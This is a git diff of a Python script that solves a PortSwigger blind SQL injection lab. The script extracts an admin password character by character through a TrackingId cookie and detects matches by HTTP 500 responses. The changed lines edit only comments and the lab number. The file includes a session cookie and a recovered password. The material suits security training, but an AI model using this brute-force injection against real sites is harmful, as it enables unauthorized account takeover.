@@ -1,6 +1,6 @@
 import requests   #you have to import the requests library --> pip install requests
 
-""" this script is brute forcing the password of an admin in data base sql injection in portswigger blind sqli lab 11 """
+""" this script is brute forcing the password of an admin in data base sql injection in portswigger blind sqli lab 12 """
 
 #list containing alphapets&numbers from 0-9
 list =['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'
@@ -15,7 +15,7 @@ burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/
                  , "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin"
                  , "Sec-Fetch-User": "?1", "Te": "trailers"}
 
-#the page should return 500 status code to you if the query is right
+#the page should return 500 status code to you if the query is right & 200 if false
 
 #brute force
 for y in range(1,21): #20 chars of the password
@@ -25,7 +25,7 @@ for y in range(1,21): #20 chars of the password
         burp0_cookies = {"TrackingId": f"y8bT74wWb5q9zTvE{payload}" # put your TrackingId & session instead
                         ,"session": "tncg8S7OkKksxnb6BrzAM9ym1CW1p2TE"} 
         data=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
-        if data.status_code==500: #if {Welcome back!} is in response then the query is true
+        if data.status_code==500: #if query is right response will be 500
             print(i,end="") #print the litter
 
 #pepq52j9eg28olkjcjf9
